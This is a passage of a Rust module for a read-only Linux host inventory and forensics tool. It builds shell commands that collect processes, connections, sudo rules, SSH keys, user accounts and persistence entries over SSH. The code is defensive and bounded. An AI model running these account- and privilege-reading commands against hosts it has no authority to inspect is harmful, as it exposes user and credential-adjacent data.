//! Read-only, target-bound Linux system inventory.
//!
//! Inventory commands are static. Typed detail requests derive validated keys
//! from collected rows and shell-quote every dynamic argument. Remote output is
//! bounded before it crosses the core boundary and is never interpreted as HTML
//! or a follow-up command.

use std::{
    collections::BTreeMap,
    net::{IpAddr, Ipv4Addr},
    sync::Arc,
    time::Duration,
};

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use uuid::Uuid;

use crate::{
    CoreError, CoreResult,
    operations::{
        DangerousConfirmation, ExecutionReceipt, OperationExecutor, OperationJournal,
        OperationPlan, OperationState, PlannedOperation, VerificationResult,
    },
    sftp::{
        MAX_EDIT_BYTES, RemotePath, SftpMutation, SftpPlannedOperation, SftpService, content_sha256,
    },
    shell_escape::{is_valid_pid, is_valid_username, shq},
    ssh::{BoundSshSession, SshService},
    target::TargetContext,
};

pub const MAX_SYSTEM_INFO_ROWS: usize = 10_000;
const MAX_ROWS: usize = MAX_SYSTEM_INFO_ROWS;
/// How every table command spells its own row cap, so the cap can be moved.
///
/// The number here is the one written into the command strings; nothing reads
/// it as a limit. [`SystemInfoTab::command`] rewrites it to one past what the
/// caller asked for, which is what makes truncation detectable at all.
const ROW_LIMIT_MARKER: &str = "head -n 500";
/// What a command prints, alone, when the machine has no tool to answer with.
///
/// Only the fact travels; the tool's name is supplied on this side by
/// [`SystemInfoTab::required_tool`], so nothing a machine writes reaches the
/// sentence an operator reads.
const NO_TOOL_MARKER: &str = "lovelyres:no-tool";
/// What a command prints, alone, when its tool is there but will not answer.
///
/// A third thing an empty table can mean, and the one that used to be hardest
/// to see: the tool is installed, so nothing looks wrong, but the daemon behind
/// it is dead and the page says the machine has nothing.
const TOOL_FAILED_MARKER: &str = "lovelyres:tool-failed";
const MAX_CELL_CHARS: usize = 4_096;
const MAX_SUMMARY_CHARS: usize = 512;
/// What a change action's precondition read, and its one-shot dispatch, are
/// given.
///
/// These are trivial reads — one /proc file, one systemctl show — so the
/// budget is not about how long the work takes but about how long the target
/// takes to answer at all. Ten seconds looked generous until a host that
/// spends eleven seconds inside PAM on every command turned every one of them
/// into "this action no longer applies to this row", which is not what had
/// happened. The read-only investigations already sit at fifteen to thirty.
const PRECONDITION_TIMEOUT: Duration = Duration::from_secs(20);

const MAX_PROCESS_INVESTIGATION_CHARS: usize = 131_072;
const MAX_SERVICE_INVESTIGATION_CHARS: usize = 131_072;
const MAX_NETWORK_INVESTIGATION_CHARS: usize = 131_072;
const MAX_USER_INVESTIGATION_CHARS: usize = 131_072;
const MAX_LOGIN_INVESTIGATION_CHARS: usize = 131_072;
const MAX_ARTIFACT_INVESTIGATION_CHARS: usize = 131_072;

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SystemInfoTab {
    Processes,
    Network,
    Services,
    Established,
    OpenPorts,
    Users,
    Autostart,
    Cron,
    SshKeys,
    LoginHistory,
    SuidFiles,
    Autoruns,
    Firewall,
    EnvVars,
    ShellConfigs,
    Packages,
    Sudoers,
    Timers,
    KernelModules,
    Rootcheck,
    Sensitive,
    RecentFiles,
    Docker,
    Kubernetes,
    WebApps,
}

impl SystemInfoTab {
    pub const ALL: [Self; 25] = [
        Self::Processes,
        Self::Network,
        Self::Services,
        Self::Established,
        Self::OpenPorts,
        Self::Users,
        Self::Autostart,
        Self::Cron,
        Self::SshKeys,
        Self::LoginHistory,
        Self::SuidFiles,
        Self::Autoruns,
        Self::Firewall,
        Self::EnvVars,
        Self::ShellConfigs,
        Self::Packages,
        Self::Sudoers,
        Self::Timers,
        Self::KernelModules,
        Self::Rootcheck,
        Self::Sensitive,
        Self::RecentFiles,
        Self::Docker,
        Self::Kubernetes,
        Self::WebApps,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Processes => "进程详情",
            Self::Network => "网络详情",
            Self::Services => "系统服务",
            Self::Established => "外连排查",
            Self::OpenPorts => "开放端口",
            Self::Users => "用户列表",
            Self::Autostart => "自启动",
            Self::Cron => "计划任务",
            Self::SshKeys => "SSH 密钥",
            Self::LoginHistory => "登录历史",
            Self::SuidFiles => "SUID 文件",
            Self::Autoruns => "启动项汇总",
            Self::Firewall => "防火墙",
            Self::EnvVars => "环境变量",
            Self::ShellConfigs => "Shell 配置",
            Self::Packages => "软件包",
            Self::Sudoers => "Sudoers",
            Self::Timers => "定时器",
            Self::KernelModules => "内核模块",
            Self::Rootcheck => "Rootkit 检查",
            Self::Sensitive => "敏感文件",
            Self::RecentFiles => "最近文件",
            Self::Docker => "Docker",
            Self::Kubernetes => "Kubernetes",
            Self::WebApps => "Web 应用",
        }
    }

    pub const fn group(self) -> SystemInfoGroup {
        match self {
            Self::Processes
            | Self::Network
            | Self::Services
            | Self::Established
            | Self::OpenPorts => SystemInfoGroup::Realtime,
            Self::Users
            | Self::Autostart
            | Self::Cron
            | Self::SshKeys
            | Self::LoginHistory
            | Self::SuidFiles
            | Self::Autoruns => SystemInfoGroup::Persistence,
            Self::Firewall
            | Self::EnvVars
            | Self::ShellConfigs
            | Self::Packages
            | Self::Sudoers
            | Self::Timers
            | Self::KernelModules
            | Self::Rootcheck
            | Self::Sensitive
            | Self::RecentFiles => SystemInfoGroup::Security,
            Self::Docker | Self::Kubernetes | Self::WebApps => SystemInfoGroup::Workload,
        }
    }

    pub const fn columns(self) -> &'static [&'static str] {
        match self {
            Self::Processes => &[
                "风险",
                "PID",
                "PPID",
                "用户",
                "状态",
                "CPU%",
                "内存%",
                "运行秒数",
                "命令",
            ],
            Self::Network => &["协议", "本地地址", "远程地址", "状态", "PID", "进程"],
            Self::Services => &["服务名", "状态", "启用状态", "描述"],
            Self::Established => &["本地地址", "远程地址", "远程端口", "PID", "进程", "用户"],
            Self::OpenPorts => &["协议", "地址", "端口", "PID", "进程", "用户"],
            Self::Users => &["用户名", "UID", "GID", "主目录", "Shell"],
            Self::Autostart => &["服务名", "命令", "状态", "类型"],
            Self::Cron => &["用户", "时间表", "命令", "来源"],
            Self::SshKeys => &["用户", "密钥类型", "公钥内容", "备注", "文件路径"],
            Self::LoginHistory => &["用户", "终端", "来源 IP", "登录时间", "状态"],
            Self::SuidFiles => &["文件路径", "权限", "所有者", "大小", "修改时间", "风险"],
            Self::Autoruns => &["类型", "名称", "状态", "路径/命令", "用户"],
            Self::Firewall => &["链", "目标", "协议", "源地址", "目标地址", "选项"],
            Self::EnvVars => &["变量名", "值", "风险"],
            Self::ShellConfigs => &["文件", "所有者", "修改时间", "行号", "内容", "风险"],
            Self::Packages => &["软件包名", "版本", "安装时间", "来源"],
            Self::Sudoers => &["用户/组", "主机", "命令", "免密", "来源"],
            Self::Timers => &["定时器", "下次触发", "剩余时间", "上次触发", "触发单元"],
            Self::KernelModules => &["模块名", "大小", "引用计数", "风险"],
            Self::Rootcheck => &["检查项", "结果", "详情"],
            Self::Sensitive => &["文件路径", "类型", "权限", "所有者", "修改时间"],
            Self::RecentFiles => &["文件路径", "修改时间", "大小", "所有者", "风险"],
            Self::Docker => &["ID", "名称", "镜像", "状态", "端口", "创建时间"],
            Self::Kubernetes => &["Namespace", "名称", "Ready", "状态", "重启", "Age"],
            Self::WebApps => &["类型", "路径/URL", "状态", "配置文件", "运行用户"],
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Sensitive | Self::RecentFiles | Self::SuidFiles | Self::Rootcheck => {
                Duration::from_secs(45)
            }
            _ => Duration::from_secs(20),
        }
    }

    /// The command for this tab, asking for one row more than can be shown.
    ///
    /// Every one of these caps its own output on the target. Because the cap
    /// was exactly the number of rows the caller wanted, a machine with more
    /// than that answered with a full table and nothing else — and the parser,
    /// never seeing a row past the limit, reported that nothing had been cut.
    /// So a busy host showed five hundred processes and told the operator that
    /// was all of them. Asking for one extra makes "was there more?" a question
    /// the answer can settle; the extra row is parsed away and never shown.
    fn command(self, maximum_rows: usize) -> String {
        let paged = self.command_template().replace(
            ROW_LIMIT_MARKER,
            &format!("head -n {}", maximum_rows.saturating_add(1)),
        );
        // Wrapped here rather than written into each command, so a tab that
        // needs a tool cannot forget to say when it is missing — and so the
        // test below can hold every tab to the same rule.
        match (self.tool_probe(), self.tool_health()) {
            (None, _) => paged,
            (Some(probe), None) => format!(
                "if {probe}; then {paged}; else printf '%s\\n' {}; fi",
                shq(NO_TOOL_MARKER),
            ),
            (Some(probe), Some(health)) => format!(
                "if ! {{ {probe}; }}; then printf '%s\\n' {absent}; \
                 elif ! {{ {health}; }}; then printf '%s\\n' {failed}; \
                 else {paged}; fi",
                absent = shq(NO_TOOL_MARKER),
                failed = shq(TOOL_FAILED_MARKER),
            ),
        }
    }

    /// The shell test for the tool this tab needs, paired with `required_tool`.
    const fn tool_probe(self) -> Option<&'static str> {
        match self {
            Self::Firewall => Some("command -v iptables-save >/dev/null 2>&1"),
            Self::Timers => Some("command -v systemctl >/dev/null 2>&1"),
            Self::Docker => Some("command -v docker >/dev/null 2>&1"),
            Self::Kubernetes => Some("command -v kubectl >/dev/null 2>&1"),
            Self::LoginHistory => Some("command -v last >/dev/null 2>&1"),
            // What the collector can actually read a configuration out of,
            // rather than anything that serves HTTP. Alpine's busybox `httpd`
            // passed the old check and then had no configuration to dump, so
            // the tab came back empty with nothing said — while the same tab
            // on a machine with no web server at all explained itself.
            Self::WebApps => Some(
                "command -v nginx >/dev/null 2>&1 || command -v apachectl >/dev/null 2>&1 \
                      || command -v apache2ctl >/dev/null 2>&1",
            ),
            Self::Network | Self::Established | Self::OpenPorts => {
                Some("command -v ss >/dev/null 2>&1 || command -v netstat >/dev/null 2>&1")
            }
            // Four, because a machine with none of them has an inventory
            // nobody can read — which is a different answer from "nothing is
            // installed", and the one this tab used to give.
            Self::Packages => Some(
                "command -v dpkg-query >/dev/null 2>&1 || command -v rpm >/dev/null 2>&1 \
                      || [ -r /lib/apk/db/installed ] || command -v pacman >/dev/null 2>&1",
            ),
            _ => None,
        }
    }

    /// A cheap question the tool must be able to answer before it is trusted.
    ///
    /// Being installed is not the same as working: a `docker` with a dead
    /// daemon and a `kubectl` with no cluster both fail while still being on
    /// the machine, and their tab then came back empty and read as "there is
    /// nothing here". The failure cannot be seen from the pipeline's exit
    /// status — `docker ps | head | awk` exits with awk's — so the tool is
    /// asked separately, in the same command, before the real work runs.
    ///
    /// `None` where being installed is enough: `ss`, `last` and `iptables-save`
    /// read the kernel or a file rather than talking to a service, so they have
    /// nothing to be disconnected from.
    const fn tool_health(self) -> Option<&'static str> {
        match self {
            Self::Docker => Some("docker version >/dev/null 2>&1"),
            Self::Kubernetes => Some("kubectl version >/dev/null 2>&1"),
            // Not `is-system-running`: a machine in `degraded` still answers
            // questions about its timers, and refusing to look there would hide
            // exactly the machine an operator is most likely investigating.
            Self::Timers => Some("systemctl list-units --type=timer >/dev/null 2>&1"),
            // Being installed is not enough here either. Without CAP_NET_ADMIN
            // `iptables-save` prints "you must be root" and stops, and the tab
            // then showed an empty firewall — which reads as "no rules" on the
            // one screen where that is the most dangerous thing to get wrong.
            // A real dump always opens a table (`*filter`) or a chain (`:INPUT`),
            // so asking for one line of that separates the two.
            Self::Firewall => Some("iptables-save 2>/dev/null | grep -q '^[*:]'"),
            _ => None,
        }
    }

    /// The tool this tab cannot be answered without, when there is exactly one.
    ///
    /// `None` means the tab reads files or `/proc` and so always has an answer;
    /// an empty table there really does mean the machine has none. Where two
    /// tools would do, the pair is named, because "no nginx and no apache" is
    /// the thing worth knowing rather than either half.
    pub const fn required_tool(self) -> Option<&'static str> {
        match self {
            Self::Firewall => Some("iptables"),
            Self::Timers => Some("systemctl"),
            Self::Docker => Some("docker"),
            Self::Kubernetes => Some("kubectl"),
            Self::LoginHistory => Some("last"),
            Self::WebApps => Some("nginx 或 apache"),
            Self::Packages => Some("dpkg、rpm、apk 或 pacman"),
            Self::Network | Self::Established | Self::OpenPorts => Some("ss 或 netstat"),
            Self::Processes
            | Self::Services
            | Self::Users
            | Self::Autostart
            | Self::Cron
            | Self::SshKeys
            | Self::SuidFiles
            | Self::Autoruns
            | Self::EnvVars
            | Self::ShellConfigs
            | Self::Sudoers
            | Self::KernelModules
            | Self::Rootcheck
            | Self::Sensitive
            | Self::RecentFiles => None,
        }
    }

    const fn command_template(self) -> &'static str {
        match self {
            Self::Processes => PROCESS_COMMAND,
            Self::Network => NETWORK_COMMAND,
            Self::Services => SERVICES_COMMAND,
            Self::Established => ESTABLISHED_COMMAND,
            Self::OpenPorts => OPEN_PORTS_COMMAND,
            Self::Users => USERS_COMMAND,
            Self::Autostart => AUTOSTART_COMMAND,
            Self::Cron => CRON_COMMAND,
            Self::SshKeys => SSH_KEYS_COMMAND,
            Self::LoginHistory => LOGIN_HISTORY_COMMAND,
            Self::SuidFiles => SUID_COMMAND,
            Self::Autoruns => AUTORUNS_COMMAND,
            Self::Firewall => FIREWALL_COMMAND,
            Self::EnvVars => ENV_COMMAND,
            Self::ShellConfigs => SHELL_CONFIG_COMMAND,
            Self::Packages => PACKAGES_COMMAND,
            Self::Sudoers => SUDOERS_COMMAND,
            Self::Timers => TIMERS_COMMAND,
            Self::KernelModules => KERNEL_MODULES_COMMAND,
            Self::Rootcheck => ROOTCHECK_COMMAND,
            Self::Sensitive => SENSITIVE_COMMAND,
            Self::RecentFiles => RECENT_FILES_COMMAND,
            Self::Docker => DOCKER_COMMAND,
            Self::Kubernetes => KUBERNETES_COMMAND,
            Self::WebApps => WEB_APPS_COMMAND,
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SystemInfoGroup {
    Realtime,
    Persistence,
    Security,
    Workload,
}

impl SystemInfoGroup {
    pub const ALL: [Self; 4] = [
        Self::Realtime,
        Self::Persistence,
        Self::Security,
        Self::Workload,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Realtime => "实时态势",
            Self::Persistence => "账户与持久化",
            Self::Security => "安全与痕迹",
            Self::Workload => "工作负载",
        }
    }
}

#[derive(Debug, Clone, Copy, Default, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SystemInfoRisk {
    #[default]
    Normal,
    Warning,
    High,
}

impl SystemInfoRisk {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Normal => "正常",
            Self::Warning => "可疑",
            Self::High => "高危",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoRequest {
    pub tab: SystemInfoTab,
    pub maximum_rows: usize,
}

impl SystemInfoRequest {
    pub fn new(tab: SystemInfoTab, maximum_rows: usize) -> CoreResult<Self> {
        if !(1..=MAX_ROWS).contains(&maximum_rows) {
            return Err(CoreError::Validation {
                subject: "system information row limit",
                message: format!("must be between 1 and {MAX_ROWS}"),
            });
        }
        Ok(Self { tab, maximum_rows })
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoRow {
    pub id: String,
    pub cells: Vec<String>,
    pub risk: SystemInfoRisk,
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoTable {
    pub tab: SystemInfoTab,
    pub columns: Vec<String>,
    pub rows: Vec<SystemInfoRow>,
    pub truncated: bool,
    /// The tool this tab needs, when the machine does not have it.
    ///
    /// An empty firewall table means one of two opposite things: this machine
    /// has no rules — wide open, act now — or nobody could look, because there
    /// is no `iptables` here. They used to look identical, and the reassuring
    /// reading is the wrong one to hand an operator during an incident.
    ///
    /// The name comes from this side, never from the machine. A compromised
    /// host that printed the marker itself could otherwise claim its firewall
    /// tool was missing and hide its own rules behind the excuse.
    pub missing_tool: Option<&'static str>,
    /// The tool this tab needs, when the machine has it but it would not answer.
    ///
    /// The third thing an empty table can mean, and the quietest: `docker` is
    /// installed so nothing looks wrong, but its daemon is dead, and the page
    /// reported that the machine had no containers.
    pub failed_tool: Option<&'static str>,
}

impl SystemInfoTable {
    /// Build a detail request only from a row that belongs to this typed result.
    /// Callers cannot combine an arbitrary row id with unvalidated shell input.
    pub fn detail_request(&self, row_id: &str) -> CoreResult<Option<SystemInfoDetailRequest>> {
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        SystemInfoDetailRequest::from_row(self.tab, row)
    }

    /// Whether asking for this row's detail would return anything.
    ///
    /// Most tabs have no detail command at all, and of the ones that do, a row
    /// whose identity does not parse has none either. A window that offers the
    /// detail regardless can only offer a button that fails.
    pub fn row_has_detail(&self, row: &SystemInfoRow) -> bool {
        SystemInfoDetailRequest::from_row(self.tab, row).is_ok_and(|request| request.is_some())
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct SystemInfoDetailRequest {
    tab: SystemInfoTab,
    row_id: String,
    key: SystemInfoDetailKey,
}

#[derive(Debug, Clone, Eq, PartialEq)]
enum SystemInfoDetailKey {
    Process { pid: u32 },
    Service { name: String },
    User { username: String },
    SshKey { key_line: String },
    SuidFile { path: String },
    Package { name: String },
    KernelModule { name: String },
    RecentFile { path: String },
}

impl SystemInfoDetailRequest {
    fn from_row(tab: SystemInfoTab, row: &SystemInfoRow) -> CoreResult<Option<Self>> {
        let cell = |index: usize| {
            row.cells
                .get(index)
                .map(String::as_str)
                .ok_or_else(|| CoreError::Validation {
                    subject: "system information detail row",
                    message: format!("missing required column {index}"),
                })
        };
        let key = match tab {
            SystemInfoTab::Processes => {
                let value = cell(1)?;
                if !is_valid_pid(value) {
                    return Err(invalid_detail_key("process PID"));
                }
                SystemInfoDetailKey::Process {
                    pid: value
                        .parse()
                        .map_err(|_| invalid_detail_key("process PID"))?,
                }
            }
            SystemInfoTab::Services => {
                let name = cell(0)?;
                if !is_valid_unit_name(name) {
                    return Err(invalid_detail_key("systemd unit name"));
                }
                SystemInfoDetailKey::Service {
                    name: name.to_owned(),
                }
            }
            SystemInfoTab::Users => {
                let username = cell(0)?;
                if !is_valid_username(username) {
                    return Err(invalid_detail_key("Linux username"));
                }
                SystemInfoDetailKey::User {
                    username: username.to_owned(),
                }
            }
            SystemInfoTab::SshKeys => {
                let key_type = cell(1)?;
                let key_content = cell(2)?;
                let comment = cell(3)?;
                if !is_valid_ssh_key_type(key_type) || !is_valid_ssh_key_content(key_content) {
                    return Err(invalid_detail_key("SSH public key"));
                }
                let key_line = bounded_text(
                    &format!("{key_type} {key_content} {comment}"),
                    MAX_CELL_CHARS,
                );
                SystemInfoDetailKey::SshKey { key_line }
            }
            SystemInfoTab::SuidFiles => SystemInfoDetailKey::SuidFile {
                path: validated_absolute_path(cell(0)?)?,
            },
            SystemInfoTab::Packages => {
                let name = cell(0)?;
                if !is_valid_package_name(name) {
                    return Err(invalid_detail_key("package name"));
                }
                SystemInfoDetailKey::Package {
                    name: name.to_owned(),
                }
            }
            SystemInfoTab::KernelModules => {
                let name = cell(0)?;
                if !is_valid_module_name(name) {
                    return Err(invalid_detail_key("kernel module name"));
                }
                SystemInfoDetailKey::KernelModule {
                    name: name.to_owned(),
                }
            }
            SystemInfoTab::RecentFiles => SystemInfoDetailKey::RecentFile {
                path: validated_absolute_path(cell(0)?)?,
            },
            _ => return Ok(None),
        };
        Ok(Some(Self {
            tab,
            row_id: row.id.clone(),
            key,
        }))
    }

    fn command(&self) -> String {
        match &self.key {
            SystemInfoDetailKey::Process { pid } => {
                let pid = shq(&pid.to_string());
                format!(
                    "p={pid}; printf 'Parent PID\\t%s\\n' \"$(ps -o ppid= -p \"$p\" 2>/dev/null | xargs)\"; \
printf 'Parent Process\\t%s\\n' \"$(pp=$(ps -o ppid= -p \"$p\" 2>/dev/null | xargs); [ -n \"$pp\" ] && ps -o comm= -p \"$pp\" 2>/dev/null)\"; \
printf 'PGID\\t%s\\n' \"$(ps -o pgid= -p \"$p\" 2>/dev/null | xargs)\"; \
printf 'SID\\t%s\\n' \"$(ps -o sid= -p \"$p\" 2>/dev/null | xargs)\"; \
printf 'Priority\\t%s\\n' \"$(ps -o pri= -p \"$p\" 2>/dev/null | xargs)\"; \
printf 'Threads\\t%s\\n' \"$(ls \"/proc/$p/task\" 2>/dev/null | wc -l)\"; \
printf 'Command Line\\t%s\\n' \"$(tr '\\0' ' ' < \"/proc/$p/cmdline\" 2>/dev/null | head -c 2048; printf '\\n')\"; \
printf 'Working Directory\\t%s\\n' \"$(readlink \"/proc/$p/cwd\" 2>/dev/null)\"; \
printf 'Executable\\t%s\\n' \"$(readlink \"/proc/$p/exe\" 2>/dev/null)\"; \
printf 'UID / GID\\t%s\\n' \"$(awk '/^(Uid|Gid):/{{printf \"%s=%s/%s/%s/%s \",$1,$2,$3,$4,$5}} END{{print \"\"}}' \"/proc/$p/status\" 2>/dev/null)\"; \
printf 'Capabilities\\t%s\\n' \"$(awk '/^Cap(Inh|Prm|Eff|Bnd|Amb):/{{printf \"%s=%s \",$1,$2}} END{{print \"\"}}' \"/proc/$p/status\" 2>/dev/null)\"; \
printf 'Memory\\t%s\\n' \"$(awk '/^(VmPeak|VmSize|VmRSS|RssAnon|VmSwap):/{{printf \"%s=%s%s \",$1,$2,$3}} END{{print \"\"}}' \"/proc/$p/status\" 2>/dev/null)\"; \
printf 'I/O\\t%s\\n' \"$(awk '/^(read_bytes|write_bytes|syscr|syscw):/{{printf \"%s=%s \",$1,$2}} END{{print \"\"}}' \"/proc/$p/io\" 2>/dev/null)\"; \
printf 'Open File Descriptors\\t%s\\n' \"$(find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 2>/dev/null | wc -l)\"; \
printf 'Cgroup\\t%s\\n' \"$(head -n 8 \"/proc/$p/cgroup\" 2>/dev/null | tr '\\n\\t' '  '; printf '\\n')\"; \
printf 'Children\\t%s\\n' \"$(pgrep -P \"$p\" 2>/dev/null | paste -sd ',' -)\"; \
printf 'Deleted Executable\\t%s\\n' \"$(readlink \"/proc/$p/exe\" 2>/dev/null | grep -q ' (deleted)$' && printf 'yes\\n' || printf 'no\\n')\"; \
printf 'Network Sockets\\t%s\\n' \"$(ss -H -tunap 2>/dev/null | grep -F \"pid=$p,\" | head -n 8 | tr '\\n\\t' '  '; printf '\\n')\" "
                )
            }
            SystemInfoDetailKey::Service { name } => {
                let name = shq(name);
                format!(
                    "n={name}; systemctl show \"$n\" --no-pager -p Description -p ActiveState -p SubState -p UnitFileState -p MainPID -p User -p Group -p MemoryCurrent -p CPUUsageNSec -p FragmentPath -p ExecStart -p WorkingDirectory -p EnvironmentFiles -p Requires -p Wants -p After -p TriggeredBy 2>/dev/null | awk -F= '{{v=substr($0,index($0,\"=\")+1); gsub(/\\t/,\" \",v); print $1\"\\t\"v}}'; \
printf 'Recent Warnings\\t%s\\n' \"$(journalctl -u \"$n\" -p warning -n 5 --no-pager 2>/dev/null | tr '\\n\\t' '  '; printf '\\n')\" "
                )
            }
            SystemInfoDetailKey::User { username } => {
                let username = shq(username);
                format!(
                    "u={username}; printf 'Account\\t%s\\n' \"$(getent passwd \"$u\" 2>/dev/null | awk -F: '{{print \"UID=\" $3 \" GID=\" $4 \" Home=\" $6 \" Shell=\" $7}}')\"; \
printf 'Groups\\t%s\\n' \"$(id -nG \"$u\" 2>/dev/null)\"; \
printf 'Password Status\\t%s\\n' \"$(passwd -S \"$u\" 2>/dev/null)\"; \
printf 'Sudo Rules\\t%s\\n' \"$(sudo -nl -U \"$u\" 2>/dev/null | tail -n +2 | tr '\\n\\t' '  '; printf '\\n')\"; \
printf 'Last Login\\t%s\\n' \"$(lastlog -u \"$u\" 2>/dev/null | tail -n 1)\"; \
printf 'Active Sessions\\t%s\\n' \"$(who 2>/dev/null | awk -v u=\"$u\" '$1==u{{n++}} END{{print n+0}}')\"; \
printf 'Process Count\\t%s\\n' \"$(pgrep -u \"$u\" 2>/dev/null | wc -l)\"; \
printf 'Cron Entries\\t%s\\n' \"$(crontab -u \"$u\" -l 2>/dev/null | awk 'NF && $1 !~ /^#/ {{n++}} END{{print n+0}}')\"; \
printf 'Authorized Keys\\t%s\\n' \"$(h=$(getent passwd \"$u\" 2>/dev/null | cut -d: -f6); [ -n \"$h\" ] && awk 'NF>=2 && $1 !~ /^#/ {{n++}} END{{print n+0}}' \"$h/.ssh/authorized_keys\" 2>/dev/null)\" "
                )
            }
            SystemInfoDetailKey::SshKey { key_line } => {
                let key_line = shq(key_line);
                format!(
                    "printf '%s\\n' {key_line} | ssh-keygen -lf - 2>/dev/null | sed 's/^/Fingerprint\\t/'"
                )
            }
            SystemInfoDetailKey::SuidFile { path } | SystemInfoDetailKey::RecentFile { path } => {
                file_detail_command(path)
            }
            SystemInfoDetailKey::Package { name } => {
                let name = shq(name);
                format!(
                    "p={name}; if command -v dpkg >/dev/null 2>&1; then \
printf 'Status\\t%s\\n' \"$(dpkg-query -W -f='${{db:Status-Abbrev}}\\n' \"$p\" 2>/dev/null)\"; \
printf 'Architecture\\t%s\\n' \"$(dpkg-query -W -f='${{Architecture}}\\n' \"$p\" 2>/dev/null)\"; \
printf 'Installed Size KiB\\t%s\\n' \"$(dpkg-query -W -f='${{Installed-Size}}\\n' \"$p\" 2>/dev/null)\"; \
printf 'Dependencies\\t%s\\n' \"$(dpkg-query -W -f='${{Depends}}\\n' \"$p\" 2>/dev/null)\"; \
printf 'Installed Files\\t%s\\n' \"$(dpkg -L \"$p\" 2>/dev/null | wc -l)\"; \
else printf 'Status\\t%s\\n' \"$(rpm -q \"$p\" 2>/dev/null)\"; \
printf 'Dependencies\\t%s\\n' \"$(rpm -qR \"$p\" 2>/dev/null | head -n 32 | tr '\\n\\t' '  '; printf '\\n')\"; \
printf 'Installed Files\\t%s\\n' \"$(rpm -ql \"$p\" 2>/dev/null | wc -l)\"; fi"
                )
            }
            SystemInfoDetailKey::KernelModule { name } => {
                let name = shq(name);
                format!(
                    "m={name}; printf 'Description\\t%s\\n' \"$(modinfo -F description \"$m\" 2>/dev/null)\"; \
printf 'File\\t%s\\n' \"$(modinfo -F filename \"$m\" 2>/dev/null)\"; \
printf 'Signer\\t%s\\n' \"$(modinfo -F signer \"$m\" 2>/dev/null)\"; \
printf 'Dependencies\\t%s\\n' \"$(modinfo -F depends \"$m\" 2>/dev/null)\" "
                )
            }
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoDetailField {
    pub label: String,
    pub value: String,
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoDetail {
    pub tab: SystemInfoTab,
    pub row_id: String,
    pub fields: Vec<SystemInfoDetailField>,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProcessInvestigationGroup {
    Basics,
    Identity,
    FilesAndMemory,
    Network,
    Relationships,
    Performance,
    Runtime,
    Security,
}

impl ProcessInvestigationGroup {
    pub const ALL: [Self; 8] = [
        Self::Basics,
        Self::Identity,
        Self::FilesAndMemory,
        Self::Network,
        Self::Relationships,
        Self::Performance,
        Self::Runtime,
        Self::Security,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Basics => "基本信息",
            Self::Identity => "用户与权限",
            Self::FilesAndMemory => "文件与内存",
            Self::Network => "网络分析",
            Self::Relationships => "进程关系",
            Self::Performance => "性能分析",
            Self::Runtime => "隔离与运行时",
            Self::Security => "安全检测",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProcessInvestigationAction {
    CommandLine,
    Executable,
    WorkingDirectory,
    Status,
    Capabilities,
    UidGid,
    OpenFiles,
    MemoryMaps,
    ResourceLimits,
    IoStats,
    MemoryUsage,
    Smaps,
    Environment,
    NetworkConnections,
    ListeningPorts,
    NetworkStatus,
    DnsSockets,
    ProcessTree,
    Children,
    Parent,
    Threads,
    CpuUsage,
    CpuAffinity,
    ContextSwitches,
    OomScore,
    Scheduler,
    SyscallSnapshot,
    KernelStack,
    FileDescriptorStats,
    Signals,
    Namespaces,
    Cgroup,
    Container,
    Uptime,
    SuspiciousPath,
    HiddenProcess,
    LdPreload,
    DeletedExecutable,
    SuspiciousNetwork,
    CryptoMining,
}

impl ProcessInvestigationAction {
    pub const ALL: [Self; 40] = [
        Self::CommandLine,
        Self::Executable,
        Self::WorkingDirectory,
        Self::Status,
        Self::Capabilities,
        Self::UidGid,
        Self::OpenFiles,
        Self::MemoryMaps,
        Self::ResourceLimits,
        Self::IoStats,
        Self::MemoryUsage,
        Self::Smaps,
        Self::Environment,
        Self::NetworkConnections,
        Self::ListeningPorts,
        Self::NetworkStatus,
        Self::DnsSockets,
        Self::ProcessTree,
        Self::Children,
        Self::Parent,
        Self::Threads,
        Self::CpuUsage,
        Self::CpuAffinity,
        Self::ContextSwitches,
        Self::OomScore,
        Self::Scheduler,
        Self::SyscallSnapshot,
        Self::KernelStack,
        Self::FileDescriptorStats,
        Self::Signals,
        Self::Namespaces,
        Self::Cgroup,
        Self::Container,
        Self::Uptime,
        Self::SuspiciousPath,
        Self::HiddenProcess,
        Self::LdPreload,
        Self::DeletedExecutable,
        Self::SuspiciousNetwork,
        Self::CryptoMining,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::CommandLine => "命令行参数",
            Self::Executable => "可执行路径",
            Self::WorkingDirectory => "当前目录",
            Self::Status => "进程状态/权限",
            Self::Capabilities => "Capabilities",
            Self::UidGid => "UID/GID 信息",
            Self::OpenFiles => "打开的文件",
            Self::MemoryMaps => "内存映射",
            Self::ResourceLimits => "资源限制",
